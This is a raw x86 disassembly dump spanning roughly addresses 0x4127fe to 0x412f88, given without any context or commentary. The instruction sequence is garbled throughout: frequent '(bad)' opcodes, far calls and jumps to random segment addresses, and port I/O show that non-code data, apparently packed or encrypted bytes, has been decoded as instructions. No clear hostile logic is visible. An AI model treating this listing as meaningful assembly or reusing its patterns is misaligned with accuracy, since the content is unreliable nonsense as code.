  4127fe:	mov    ecx,0xb40ccc6d
  412803:	scas   eax,DWORD PTR es:[edi]
  412804:	outs   dx,DWORD PTR ds:[esi]
  412805:	jmp    0x412872
  412807:	lods   al,BYTE PTR ds:[esi]
  412808:	dec    edi
  412809:	xor    DWORD PTR [edx+0x3],esp
  41280c:	call   0x5fe9:0x8b8396e3
  412813:	mov    dl,0x57
  412815:	pop    eax
  412816:	xchg   ebp,eax
  412817:	imul   BYTE PTR [edx-0x43]
  41281a:	cmp    ch,BYTE PTR [ebp-0x7]
  41281d:	repz xor al,0x16
  412820:	inc    esi
  412821:	or     eax,DWORD PTR [ebp-0x58]
  412824:	ret    0x2af0
  412827:	mov    ds:0x2482fc40,eax
  41282c:	jmp    ebp
  41282e:	jnp    0x412836
  412830:	jnp    0x4127fb
  412832:	xor    ebp,eax
  412834:	nop
  412835:	sbb    eax,0x9560cd8d
  41283a:	int    0x8d
  41283c:	fisub  WORD PTR [ecx]
  41283e:	mov    al,0xae
  412840:	repz inc edi
  412842:	dec    eax
  412843:	fistp  QWORD PTR ds:0x292e3c39
  412849:	add    edi,esp
  41284b:	pop    ss
  41284c:	iret   
  41284d:	mov    ds:0xed003a00,eax
  412852:	jg     0x412834
  412854:	mov    esp,0x73b71f6b
  412859:	mov    edx,es
  41285b:	xchg   esi,eax
  41285c:	jmp    0x41285b
  41285e:	fwait
  41285f:	add    BYTE PTR [ebx],bh
  412861:	cmp    bl,BYTE PTR [eax+0x6b7ac6ce]
  412867:	ret    0xe26
  41286a:	test   ebx,0xd1930fcd
  412870:	cmp    ecx,DWORD PTR [esi]
  412872:	int3   
  412873:	push   edi
  412874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412875:	and    al,0xde
  412877:	add    DWORD PTR [eax-0x3465397f],edx
  41287d:	jnp    0x412839
  41287f:	jp     0x4128ff
  412881:	adc    ebx,ebp
  412883:	mov    WORD PTR [ebx],?
  412885:	adc    DWORD PTR [ebp+0x2fbd2068],eax
  41288b:	xor    DWORD PTR [edx],ecx
  41288d:	push   esp
  41288e:	mov    ecx,0x636fc0d5
  412893:	sbb    eax,0xe3e300d9
  412898:	mov    eax,ds:0x5b0464ec
  41289d:	mov    ch,0xff
  41289f:	or     bl,0xa0
  4128a2:	pop    eax
  4128a3:	pop    edi
  4128a4:	jo     0x4128a6
  4128a6:	pop    eax
  4128a7:	stos   BYTE PTR es:[edi],al
  4128a8:	pop    es
  4128a9:	loope  0x4128b1
  4128ab:	inc    edi
  4128ac:	(bad)  
  4128ad:	jg     0x412886
  4128af:	ins    BYTE PTR es:[edi],dx
  4128b0:	jnp    0x412869
  4128b2:	int    0x39
  4128b4:	and    ah,bh
  4128b6:	fbld   TBYTE PTR [edx+0x19]
  4128b9:	push   ebp
  4128ba:	push   eax
  4128bb:	pop    ds
  4128bc:	out    dx,al
  4128bd:	std    
  4128be:	mov    bl,0x88
  4128c0:	inc    edi
  4128c1:	lds    edx,FWORD PTR [ebx]
  4128c3:	imul   edx,DWORD PTR [ecx+0xf563ff6],0x79586e43
  4128cd:	rol    DWORD PTR [edi],0x95
  4128d0:	adc    al,dh
  4128d2:	dec    esp
  4128d3:	(bad)  
  4128d4:	xor    al,0xee
  4128d6:	cmp    eax,0xa3bca35f
  4128db:	jl     0x4128b6
  4128dd:	jb     0x4128b9
  4128df:	addr16 (bad) 
  4128e1:	mov    ds:0xc141f2f5,eax
  4128e6:	mov    ds:0xf5e86212,eax
  4128eb:	cmp    eax,0x6962fa78
  4128f0:	dec    esi
  4128f1:	sti    
  4128f2:	xor    BYTE PTR [eax],bl
  4128f4:	adc    al,0xd7
  4128f6:	idiv   DWORD PTR [esi-0x30]
  4128f9:	cli    
  4128fa:	cwde   
  4128fb:	mul    ah
  4128fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128fe:	outs   dx,BYTE PTR ds:[esi]
  4128ff:	enter  0x3da,0xba
  412903:	je     0x412976
  412905:	add    DWORD PTR [edi+0x1c42c3d],esi
  41290b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290c:	clc    
  41290d:	(bad)
  412911:	cs stos DWORD PTR es:[edi],eax
  412913:	pop    eax
  412914:	imul   esi,DWORD PTR ds:0xc1b8f32c,0xe240172
  41291e:	lods   al,BYTE PTR ds:[esi]
  41291f:	dec    edx
  412920:	popa   
  412921:	sbb    esi,esp
  412923:	or     ch,BYTE PTR [ebx-0x43]
  412926:	sbb    cl,cl
  412928:	push   ds
  412929:	inc    esp
  41292a:	ins    DWORD PTR es:[edi],dx
  41292b:	mov    al,0xce
  41292d:	es jmp 0xf72a:0x1d5d63da
  412935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412936:	sahf   
  412937:	inc    edi
  412938:	dec    edx
  412939:	pop    esi
  41293a:	push   es
  41293b:	pop    es
  41293c:	dec    ebx
  41293d:	test   BYTE PTR cs:[eax],0xbe
  412941:	call   0x7f2f:0xaaf3dc3d
  412948:	mov    ecx,0x2bd8ce1f
  41294d:	sub    al,0xf2
  41294f:	mov    bh,0x8d
  412951:	loope  0x4128e2
  412953:	popf   
  412954:	sbb    dh,BYTE PTR es:[ecx+0x636b1aaa]
  41295b:	jmp    0xf732d40
  412960:	aaa    
  412961:	cwde   
  412962:	pop    es
  412963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412964:	or     al,0x8f
  412966:	and    ch,ah
  412968:	(bad)  
  412969:	cld    
  41296a:	arpl   ax,si
  41296c:	ficomp DWORD PTR [ecx]
  41296e:	(bad)  [ebx-0x3d]
  412971:	add    BYTE PTR [esi-0x60],bl
  412974:	or     edi,DWORD PTR [ebx-0x5522d97f]
  41297a:	jnp    0x412945
  41297c:	xor    edi,edi
  41297e:	popa   
  41297f:	loopne 0x4129a2
  412981:	mov    edx,0x8eef2143
  412986:	cwde   
  412987:	adc    eax,0x5bb8bb6b
  41298c:	fs mov edx,0x6abcd0a2
  412992:	mov    esi,0xb46154e0
  412997:	js     0x4129df
  412999:	jo     0x412942
  41299b:	out    dx,al
  41299c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41299d:	(bad)  
  41299e:	out    dx,eax
  41299f:	out    dx,eax
  4129a0:	xor    eax,0xdd289210
  4129a5:	mov    esp,0xb8d01055
  4129aa:	dec    ecx
  4129ab:	push   ds
  4129ac:	and    al,0xde
  4129ae:	xor    BYTE PTR [ebp-0x58],dl
  4129b1:	adc    bh,BYTE PTR ds:[ebp-0x4e4db374]
  4129b8:	arpl   WORD PTR [esi],si
  4129ba:	in     al,dx
  4129bb:	dec    ecx
  4129bc:	inc    ebx
  4129bd:	rcl    BYTE PTR [ebx],cl
  4129bf:	enter  0x2b7a,0x2f
  4129c3:	adc    al,0xb2
  4129c5:	pusha  
  4129c6:	xchg   esi,eax
  4129c7:	cmp    dl,ch
  4129c9:	out    0x57,al
  4129cb:	jne    0x4129ed
  4129cd:	jle    0x4129ac
  4129cf:	call   0xcd75:0x39fc96ea
  4129d6:	loop   0x41299c
  4129d8:	pushf  
  4129d9:	(bad)  
  4129da:	push   cs
  4129db:	sar    DWORD PTR [ecx-0x61f0bd27],0x1c
  4129e2:	out    0xc0,al
  4129e4:	mov    DWORD PTR [esi],edx
  4129e6:	ins    BYTE PTR es:[edi],dx
  4129e7:	add    ebp,DWORD PTR [eax+0x75]
  4129ea:	js     0x412a0c
  4129ec:	sbb    ch,bl
  4129ee:	cdq    
  4129ef:	mov    al,0xf4
  4129f1:	sub    DWORD PTR [ebp+0xff6adc2],0xa7232f
  4129fb:	fwait
  4129fc:	pop    ebp
  4129fd:	push   edi
  4129fe:	xor    ch,bh
  412a00:	and    edx,DWORD PTR [edi-0x1a61d252]
  412a06:	cs pushf 
  412a08:	xchg   DWORD PTR [edi+0x4b],esi
  412a0b:	out    dx,eax
  412a0c:	and    ebx,eax
  412a0e:	repz rol esp,0x55
  412a12:	mov    ebx,0xaf615166
  412a17:	(bad)  
  412a18:	pusha  
  412a19:	sbb    al,0xaf
  412a1b:	retf   
  412a1c:	mul    BYTE PTR [esi-0x76813bcb]
  412a22:	or     BYTE PTR [edx-0x1b],dh
  412a25:	test   al,0x1
  412a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a28:	scas   eax,DWORD PTR es:[edi]
  412a29:	out    0xb6,al
  412a2b:	aaa    
  412a2c:	mov    al,ds:0x8a6e70f6
  412a31:	add    DWORD PTR ds:0xc3a7d0ce,edi
  412a37:	fistp  QWORD PTR [ecx]
  412a39:	int3   
  412a3a:	push   ds
  412a3b:	xchg   esi,eax
  412a3c:	mov    dh,0x5a
  412a3e:	int3   
  412a3f:	xor    bl,BYTE PTR [esi-0x7b5dfe]
  412a45:	pop    edx
  412a46:	xor    eax,0xa7e68b25
  412a4b:	and    DWORD PTR [ecx],edx
  412a4d:	push   edx
  412a4e:	mov    ds:0x64f8fb7c,al
  412a53:	fstp   QWORD PTR [eax+ecx*1-0x46]
  412a57:	fucomi st,st(0)
  412a59:	enter  0x9702,0xf9
  412a5d:	push   ebp
  412a5e:	mov    eax,ds:0x8a4408f7
  412a63:	clc    
  412a64:	pusha  
  412a65:	cwde   
  412a66:	dec    ebx
  412a67:	int    0xce
  412a69:	lods   al,BYTE PTR ds:[esi]
  412a6a:	mov    al,0xbd
  412a6c:	add    ah,BYTE PTR [edi+ecx*1]
  412a6f:	imul   ebp,DWORD PTR [ebx-0x7e9eca20],0xffffffc6
  412a76:	fst    DWORD PTR [ebp+0x20]
  412a79:	adc    ah,bl
  412a7b:	aas    
  412a7c:	arpl   WORD PTR [eax-0x75],bp
  412a7f:	les    edx,FWORD PTR [ebx+0x1b709e66]
  412a85:	inc    eax
  412a86:	push   ebx
  412a87:	xor    BYTE PTR ds:0x5c82c06,ch
  412a8d:	jae    0x412a10
  412a8f:	sbb    DWORD PTR [eax+0xf],esi
  412a92:	xor    cl,BYTE PTR [eax]
  412a94:	div    BYTE PTR [esi]
  412a96:	mov    cl,0xfd
  412a98:	(bad)  
  412a99:	push   edx
  412a9a:	cli    
  412a9b:	sub    DWORD PTR gs:0x2787c1dd,ebx
  412aa2:	inc    ebx
  412aa3:	inc    esp
  412aa4:	jns    0x412aec
  412aa6:	push   eax
  412aa7:	(bad)  
  412aa9:	mov    es,WORD PTR [ebp+0x47]
  412aac:	mov    esp,0xb7e09764
  412ab1:	pusha  
  412ab2:	push   0x6f0ae401
  412ab7:	push   0xffffffbe
  412ab9:	popf   
  412aba:	call   FWORD PTR [ebx]
  412abc:	sar    BYTE PTR [edx],1
  412abe:	sar    BYTE PTR [ebp+0x46],1
  412ac1:	dec    eax
  412ac2:	push   esi
  412ac3:	mov    ah,0xd4
  412ac5:	or     al,0x63
  412ac7:	mov    bh,0x7d
  412ac9:	mov    esi,0xbf447633
  412ace:	jo     0x412ae0
  412ad0:	jo     0x412a9a
  412ad2:	xlat   BYTE PTR ds:[ebx]
  412ad3:	push   cs
  412ad4:	mov    esp,0xb0164f4e
  412ad9:	xor    eax,0x9325d9d
  412ade:	jbe    0x412b05
  412ae0:	xchg   ebx,eax
  412ae1:	repnz outs dx,BYTE PTR ds:[esi]
  412ae3:	sub    ebx,ebp
  412ae5:	or     BYTE PTR [edi+0x693da6c3],al
  412aeb:	dec    ebp
  412aec:	pop    ds
  412aed:	fidivr DWORD PTR [ecx+0x24fcd915]
  412af3:	int    0x70
  412af5:	imul   edi,DWORD PTR [esi],0x58
  412af8:	cmp    DWORD PTR [edx+0xf9d48be],eax
  412afe:	sbb    BYTE PTR [ebx+0x28],bh
  412b01:	outs   dx,BYTE PTR ds:[esi]
  412b02:	outs   dx,DWORD PTR ds:[esi]
  412b03:	mov    ebx,0x9b6f8bcd
  412b08:	popf   
  412b09:	xor    DWORD PTR [edx-0x395be359],ebp
  412b0f:	mov    bh,0x3
  412b11:	jo     0x412ade
  412b13:	xor    esp,ebx
  412b15:	clc    
  412b16:	xchg   ebx,eax
  412b17:	add    DWORD PTR [edi+eiz*8+0x49],0x58
  412b1c:	add    dh,BYTE PTR [esi-0x79031f3c]
  412b22:	fisub  DWORD PTR [eax]
  412b24:	cmp    dh,BYTE PTR [ebp+0x3820f93a]
  412b2a:	cs and ebp,ebp
  412b2d:	jb     0x412b4f
  412b2f:	fisubr DWORD PTR [edi-0x60c3a37f]
  412b35:	pop    edi
  412b36:	mov    ds:0x63843317,eax
  412b3b:	xor    al,0xed
  412b3d:	int3   
  412b3e:	push   0xffffffd3
  412b40:	add    al,0xac
  412b42:	or     eax,0x8af6ee9d
  412b47:	mov    eax,ds:0x3e8338e2
  412b4c:	sar    DWORD PTR [ebx],1
  412b4e:	(bad)  [edi+ebp*8]
  412b51:	cld    
  412b52:	aam    0x3a
  412b54:	inc    ebx
  412b55:	shl    BYTE PTR [esi+0x21394280],cl
  412b5b:	jmp    0x412b5f
  412b5d:	add    BYTE PTR [edi+edi*8+0x76c61c4c],0x93
  412b65:	mov    cs,WORD PTR [bp+di+0x2ef]
  412b6a:	pop    ebx
  412b6b:	ret    0x664f
  412b6e:	retf   0x4b6d
  412b71:	pop    ebp
  412b72:	mov    ecx,0xdbaf9af8
  412b77:	icebp  
  412b78:	inc    DWORD PTR [ebp+0x33]
  412b7b:	cdq    
  412b7c:	mov    edx,0xc5ac5ee6
  412b81:	not    DWORD PTR [esi+ecx*8]
  412b84:	and    bl,cl
  412b86:	stos   DWORD PTR es:[edi],eax
  412b87:	push   es
  412b88:	hlt    
  412b89:	pop    eax
  412b8a:	push   eax
  412b8b:	xchg   edx,eax
  412b8c:	into   
  412b8d:	clc    
  412b8e:	clc    
  412b8f:	in     al,dx
  412b90:	or     ah,ah
  412b92:	xchg   DWORD PTR [ebx],esp
  412b94:	jmp    0xac3fa855
  412b99:	jnp    0x412bd2
  412b9b:	rol    eax,0x2e
  412b9e:	jne    0x412b86
  412ba0:	dec    esp
  412ba1:	cli    
  412ba2:	out    0xc0,al
  412ba4:	cmp    eax,0xc00e36bc
  412ba9:	jmp    0x4ccb0477
  412bae:	icebp  
  412baf:	into   
  412bb0:	inc    ebp
  412bb1:	xor    al,0x2f
  412bb3:	cmp    al,0xc1
  412bb5:	or     bh,dl
  412bb7:	inc    ecx
  412bb8:	cmp    eax,0x2bcdb7b5
  412bbd:	mov    ds:0x9235518,eax
  412bc2:	mov    WORD PTR [ebp+ecx*2+0x3c],gs
  412bc6:	repz daa 
  412bc8:	popf   
  412bc9:	sbb    al,0x63
  412bcb:	push   ss
  412bcc:	mov    bl,0x74
  412bce:	xor    BYTE PTR [esi],ah
  412bd0:	pushf  
  412bd1:	inc    esi
  412bd2:	adc    eax,0xa8ad8aa5
  412bd7:	xor    bh,cl
  412bd9:	sub    BYTE PTR [ecx+0x48304ce6],0x31
  412be0:	mov    esp,0xa77b78c8
  412be5:	cmp    DWORD PTR [edx],ebp
  412be7:	fdivr  QWORD PTR [ecx]
  412be9:	rcr    BYTE PTR [edi+edx*1+0x5c],1
  412bed:	cwde   
  412bee:	call   0x4312:0x40d87a69
  412bf5:	jnp    0x412b9a
  412bf7:	loopne 0x412bf6
  412bf9:	mov    al,0x32
  412bfb:	xor    ebx,DWORD PTR [edi]
  412bfd:	mov    DWORD PTR [edi+0x7d],ebp
  412c00:	(bad)  
  412c01:	(bad)  
  412c02:	cld    
  412c03:	add    BYTE PTR [edi-0x1c],ah
  412c06:	xchg   edx,eax
  412c07:	ror    DWORD PTR [ecx],0x5d
  412c0a:	aam    0x74
  412c0c:	cmp    bh,dh
  412c0e:	sbb    esi,DWORD PTR [ebp+0x41b52983]
  412c14:	ret    0x2177
  412c17:	lahf   
  412c18:	ins    DWORD PTR es:[edi],dx
  412c19:	bound  ebx,QWORD PTR [edi-0x7ee5a535]
  412c1f:	mov    ah,BYTE PTR [esi]
  412c21:	(bad)
  412c24:	push   bx
  412c26:	fdiv   DWORD PTR [esi]
  412c28:	fs dec eax
  412c2a:	sbb    bh,BYTE PTR [esi]
  412c2c:	inc    ch
  412c2e:	in     al,dx
  412c2f:	jecxz  0x412bd6
  412c31:	(bad)  
  412c32:	loope  0x412c89
  412c34:	lods   eax,DWORD PTR ds:[esi]
  412c35:	pop    ecx
  412c36:	push   esp
  412c37:	mov    eax,0xf8dc435e
  412c3c:	push   ecx
  412c3d:	or     edx,DWORD PTR [edi-0x2acd7111]
  412c43:	enter  0x24c4,0x88
  412c47:	dec    eax
  412c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c49:	je     0x412c10
  412c4b:	sbb    al,0x14
  412c4d:	cmp    dl,ch
  412c4f:	xchg   edx,eax
  412c50:	inc    ebx
  412c51:	sub    ecx,DWORD PTR [ebp+0x3f0e310c]
  412c57:	rcr    BYTE PTR [ecx+0x2a],0x6b
  412c5b:	xchg   edx,eax
  412c5c:	rdtsc  
  412c5e:	jno    0x412c6a
  412c60:	xchg   esp,eax
  412c61:	and    DWORD PTR [esi],edi
  412c63:	xor    BYTE PTR [ebx+0x3f3af147],bh
  412c69:	sub    edx,ebx
  412c6b:	mov    WORD PTR [eax],es
  412c6d:	dec    esi
  412c6e:	and    edi,DWORD PTR [ecx-0x59]
  412c71:	and    edi,DWORD PTR [esi-0x39724339]
  412c77:	mov    ch,0xef
  412c79:	push   0x7e
  412c7b:	stc    
  412c7c:	ins    DWORD PTR es:[edi],dx
  412c7d:	int3   
  412c7e:	sub    ah,ah
  412c80:	adc    BYTE PTR [edi-0x46945093],dh
  412c86:	ins    BYTE PTR es:[edi],dx
  412c87:	mov    al,ds:0x68d50fac
  412c8c:	call   0x4ea6:0xd0065673
  412c93:	dec    ebx
  412c94:	ret    0x8bb4
  412c97:	mov    bl,0xc6
  412c99:	out    0xb9,eax
  412c9b:	sar    esp,0xa6
  412c9e:	(bad)  
  412c9f:	ret    
  412ca0:	pop    esp
  412ca1:	jb     0x412cf6
  412ca3:	addr16 jle 0x412d18
  412ca6:	adc    al,ch
  412ca8:	pop    ebp
  412ca9:	packuswb mm4,mm3
  412cac:	ins    DWORD PTR es:[edi],dx
  412cad:	retf   0x1ebf
  412cb0:	hlt    
  412cb1:	mov    dl,0x9c
  412cb3:	(bad)
  412cb6:	push   edx
  412cb7:	jnp    0x412d34
  412cb9:	mov    esi,0xccd0f7b8
  412cbe:	push   ecx
  412cbf:	loop   0x412c99
  412cc1:	mov    fs,WORD PTR [eax+edi*8+0x2e]
  412cc5:	mov    BYTE PTR [esp+ebp*2+0x40],bl
  412cc9:	call   0x1747:0x6d3e3722
  412cd0:	sbb    ah,BYTE PTR [edi+0x23]
  412cd3:	dec    ebp
  412cd4:	add    cl,BYTE PTR [ebx+0x3b]
  412cd7:	(bad)  
  412cd8:	fsub   QWORD PTR [ebx-0x73]
  412cdb:	mov    eax,ds:0xc713b6c2
  412ce0:	dec    esi
  412ce1:	pusha  
  412ce2:	leave  
  412ce3:	cs cdq 
  412ce5:	xor    al,0x30
  412ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce8:	jo     0x412cdc
  412cea:	aaa    
  412ceb:	add    DWORD PTR [ecx-0x4eb8b9c4],ebp
  412cf1:	xor    edx,DWORD PTR [ebp-0x40]
  412cf4:	dec    eax
  412cf5:	(bad)  
  412cf6:	jns    0x412c95
  412cf8:	push   edx
  412cf9:	push   0x4e
  412cfb:	and    eax,0x14f6b1c
  412d00:	sub    esi,DWORD PTR [eax+0x71756050]
  412d06:	pusha  
  412d07:	lock mov al,ds:0x15a18be5
  412d0d:	xchg   esp,eax
  412d0e:	jg     0x412d79
  412d10:	sar    DWORD PTR [esi+0x5fbba0d9],1
  412d16:	dec    ecx
  412d17:	sbb    BYTE PTR [ebp-0x223296d2],al
  412d1d:	jnp    0x412d67
  412d1f:	sbb    bl,BYTE PTR [edx]
  412d21:	cmp    eax,0xab9df31f
  412d26:	jns    0x412d96
  412d28:	mov    ah,0xf7
  412d2a:	jp     0x412d63
  412d2c:	sbb    eax,0xff60f88f
  412d31:	xchg   ebx,eax
  412d32:	fabs   
  412d34:	dec    edi
  412d36:	dec    esp
  412d37:	loopne 0x412d5f
  412d39:	mov    eax,ds:0x1fe49108
  412d3e:	xor    ecx,DWORD PTR [esp+eax*8+0x40]
  412d42:	xor    al,0x73
  412d44:	adc    DWORD PTR [eax+0x744fd388],ebx
  412d4a:	ins    BYTE PTR es:[edi],dx
  412d4b:	sti    
  412d4c:	inc    edi
  412d4d:	nop
  412d4e:	pop    eax
  412d4f:	jmp    0x2ed77200
  412d54:	lds    esi,FWORD PTR [edi-0x37]
  412d57:	dec    ebp
  412d58:	lods   eax,DWORD PTR ds:[esi]
  412d59:	push   es
  412d5a:	hlt    
  412d5b:	sub    BYTE PTR [edx+0x4b],dl
  412d5e:	lock push cs
  412d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d61:	adc    eax,0xd80b88d6
  412d66:	mov    ecx,0x1f8fc678
  412d6b:	cmp    BYTE PTR [ebp+0x58e223a2],dh
  412d71:	sub    edi,DWORD PTR [ebp-0x31]
  412d74:	imul   ecx,ecx,0x14a29629
  412d7a:	loopne 0x412d23
  412d7c:	push   edi
  412d7d:	repnz fwait
  412d7f:	cmp    edi,esi
  412d81:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  412d83:	into   
  412d84:	outs   dx,DWORD PTR ds:[esi]
  412d85:	pop    eax
  412d86:	adc    ch,BYTE PTR [esi-0x71]
  412d89:	adc    DWORD PTR [esi-0x4],esp
  412d8c:	(bad)  
  412d8e:	mov    ch,0xa2
  412d90:	jge    0x412d21
  412d92:	add    al,0xfd
  412d94:	fcomp  st(7)
  412d96:	mul    BYTE PTR [edi+0x423eaf84]
  412d9c:	sti    
  412d9d:	xor    eax,0x6c2769d4
  412da2:	jl     0x412dfb
  412da4:	lods   al,BYTE PTR ds:[esi]
  412da5:	adc    al,0x54
  412da7:	fiadd  WORD PTR [ecx-0x41]
  412daa:	inc    ebp
  412dab:	cmp    BYTE PTR [ecx+0x16],0xb6
  412daf:	fidiv  DWORD PTR [edi]
  412db1:	test   BYTE PTR [esi-0x5f],0xd4
  412db5:	ret    0x2082
  412db8:	and    eax,0x3b746a4d
  412dbd:	popa   
  412dbe:	and    edi,DWORD PTR [ebx]
  412dc0:	ja     0x412ddd
  412dc2:	cmp    BYTE PTR [edi],0x7a
  412dc5:	dec    ecx
  412dc6:	jle    0x412dc7
  412dc8:	fadd   st(0),st
  412dca:	push   cs
  412dcb:	jge    0x412e29
  412dcd:	lahf   
  412dce:	cmp    bh,BYTE PTR [ecx]
  412dd0:	sar    BYTE PTR [edx],0xd1
  412dd3:	test   esp,edi
  412dd5:	cmp    DWORD PTR [edx],esi
  412dd7:	popf   
  412dd8:	neg    edi
  412dda:	std    
  412ddb:	fdiv   st,st(7)
  412ddd:	mov    eax,0xf4e06b13
  412de2:	aad    0xd6
  412de4:	adc    DWORD PTR [ecx],esp
  412de6:	pop    edx
  412de7:	pop    ecx
  412de8:	nop
  412de9:	sub    al,0xd
  412deb:	sbb    esp,DWORD PTR [ebx+eax*4+0x6c5a2524]
  412df2:	pop    ecx
  412df3:	pop    eax
  412df4:	adc    DWORD PTR [ecx+ecx*1],ebp
  412df7:	aam    0x4f
  412df9:	push   esp
  412dfa:	int3   
  412dfb:	push   cs
  412dfc:	cli    
  412dfd:	jo     0x412e74
  412dff:	lds    eax,FWORD PTR [esi]
  412e01:	jns    0x412dd1
  412e03:	aad    0x21
  412e05:	jmp    0x412e3f
  412e07:	shl    al,cl
  412e09:	scas   eax,DWORD PTR es:[edi]
  412e0a:	cmp    ch,BYTE PTR ds:0x4dc60b5c
  412e10:	xor    DWORD PTR [eax+0x77],0xbc358af3
  412e17:	int3   
  412e18:	stos   DWORD PTR es:[edi],eax
  412e19:	xlat   BYTE PTR ds:[ebx]
  412e1a:	jle    0x412dd8
  412e1c:	cli    
  412e1d:	jno    0x412dfb
  412e1f:	push   ss
  412e20:	cmp    al,0x41
  412e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e23:	xchg   edx,eax
  412e24:	mov    al,0xcf
  412e26:	sbb    BYTE PTR [esi],cl
  412e28:	fist   WORD PTR [edx+0x14]
  412e2b:	adc    dh,bl
  412e2d:	mov    esp,0x3d14beda
  412e32:	div    BYTE PTR [edi-0x5c]
  412e35:	call   FWORD PTR [ecx]
  412e37:	call   0xe060:0xf4584a21
  412e3e:	xchg   esp,eax
  412e3f:	jmp    0x412e4f
  412e41:	adc    DWORD PTR ds:0xffb80b67,0x29
  412e48:	adc    al,0xa7
  412e4a:	inc    edi
  412e4b:	push   esp
  412e4c:	mov    esp,0x4d3500f5
  412e51:	(bad)  
  412e53:	(bad)  
  412e54:	jmp    0xd8ff:0xbce0451b
  412e5b:	retf   0xe402
  412e5e:	mov    esp,edx
  412e60:	mov    esi,0xef9dd4e8
  412e65:	call   0xbedbef1a
  412e6a:	xchg   esp,eax
  412e6b:	cs and al,0x1e
  412e6e:	or     al,0xad
  412e70:	pop    edx
  412e71:	adc    DWORD PTR [esi+esi*2-0x5f],0xad5a5347
  412e79:	jl     0x412ee2
  412e7b:	outs   dx,BYTE PTR ds:[esi]
  412e7c:	sbb    cl,BYTE PTR [ecx-0x15]
  412e7f:	jl     0x412eb9
  412e81:	fwait
  412e82:	ins    BYTE PTR es:[edi],dx
  412e83:	(bad)  
  412e84:	inc    DWORD PTR [ebp-0x79]
  412e87:	mov    ds:0xeddc636d,al
  412e8c:	add    ch,dh
  412e8e:	xchg   edi,eax
  412e8f:	mov    esp,0x53a9f93f
  412e94:	push   ebp
  412e95:	xor    DWORD PTR [ecx-0x5d87a837],ecx
  412e9b:	push   ecx
  412e9c:	pop    esi
  412e9d:	int3   
  412e9e:	dec    ecx
  412e9f:	mov    ch,0x22
  412ea1:	ss mov edx,0x40caedbd
  412ea7:	scas   al,BYTE PTR es:[edi]
  412ea8:	push   es
  412ea9:	arpl   cx,di
  412eab:	inc    ebp
  412eac:	rol    BYTE PTR [edi-0x69200310],cl
  412eb2:	xchg   esp,eax
  412eb3:	or     ah,BYTE PTR [esi+0x477cfbb]
  412eb9:	add    al,0x14
  412ebb:	mov    ds:0xf6c86605,eax
  412ec0:	and    BYTE PTR [ecx],bl
  412ec2:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ec4:	jle    0x412f0a
  412ec6:	dec    esp
  412ec7:	dec    ecx
  412ec8:	stos   BYTE PTR es:[edi],al
  412ec9:	jp     0x412e72
  412ecb:	cli    
  412ecc:	inc    ecx
  412ecd:	daa    
  412ece:	sub    ebp,DWORD PTR [eax+0x1e]
  412ed1:	stos   BYTE PTR es:[edi],al
  412ed2:	xchg   esi,ebx
  412ed4:	or     bh,BYTE PTR [ebx+0xe]
  412ed7:	(bad)  
  412ed9:	shl    BYTE PTR [ebx-0x4400b9ab],cl
  412edf:	test   BYTE PTR [ebp-0x3],al
  412ee2:	stc    
  412ee3:	ror    DWORD PTR [esi-0x3f917e9e],cl
  412ee9:	cmp    BYTE PTR [ebx+edi*8+0x4e],dl
  412eed:	je     0x412f57
  412eef:	fisttp WORD PTR [edx]
  412ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef2:	or     BYTE PTR [edx+ecx*8+0x2f],ah
  412ef6:	test   eax,0x6d1b17ff
  412efb:	add    DWORD PTR [edi],edi
  412efd:	std    
  412efe:	scas   al,BYTE PTR es:[edi]
  412eff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f00:	and    al,0x3a
  412f02:	les    ebp,FWORD PTR [esi]
  412f04:	(bad)  
  412f05:	jne    0x412f7f
  412f07:	xchg   edi,eax
  412f08:	hlt    
  412f09:	inc    eax
  412f0a:	jmp    FWORD PTR [ebp+0x7a]
  412f0d:	fcom   DWORD PTR [esi+ebx*8+0x45]
  412f11:	push   0xffffffd7
  412f13:	and    BYTE PTR [edx+0x32],0x58
  412f17:	push   edi
  412f18:	jle    0x412f80
  412f1a:	xchg   ebx,eax
  412f1b:	or     DWORD PTR [ecx+0x772daa98],edx
  412f21:	(bad)  
  412f22:	push   esi
  412f23:	imul   eax,DWORD PTR [ebx],0x77
  412f26:	(bad)  
  412f27:	mov    cl,0x7b
  412f29:	mul    BYTE PTR [ecx+0x30]
  412f2c:	addr16 out dx,eax
  412f2e:	dec    esp
  412f2f:	icebp  
  412f30:	jecxz  0x412f96
  412f32:	ret    0xbd26
  412f35:	dec    esp
  412f36:	inc    ecx
  412f37:	mov    dl,BYTE PTR [ebp+0x16]
  412f3a:	inc    eax
  412f3b:	data16 xor al,0xe1
  412f3e:	frndint 
  412f40:	mov    dl,0x37
  412f42:	sbb    BYTE PTR [edi+edi*8-0x4e],bh
  412f46:	or     ch,dh
  412f48:	cmc    
  412f49:	sub    eax,0xf0722650
  412f4e:	fisubr DWORD PTR [edx]
  412f50:	stos   BYTE PTR es:[edi],al
  412f51:	push   ebp
  412f52:	fmul   DWORD PTR [eax+0x57f9b17e]
  412f58:	mov    esp,ebp
  412f5a:	scas   eax,DWORD PTR es:[edi]
  412f5b:	lea    ebx,[eax+0x7d48308e]
  412f61:	into   
  412f62:	mov    ecx,0x928fb6da
  412f67:	imul   eax,DWORD PTR [edi],0x1a9029e1
  412f6d:	xchg   ebx,eax
  412f6e:	dec    ebp
  412f6f:	or     DWORD PTR [ebp+0x4b37b079],ebp
  412f75:	je     0x412f65
  412f77:	add    al,0x2
  412f79:	mov    ch,0x34
  412f7b:	dec    eax
  412f7c:	loope  0x412f56
  412f7e:	enter  0xac70,0x49
  412f82:	jmp    0x412f64
  412f84:	ret    
  412f85:	and    DWORD PTR [esi-0x65],esp
  412f88:	mov    ebx,0xbd566c9d
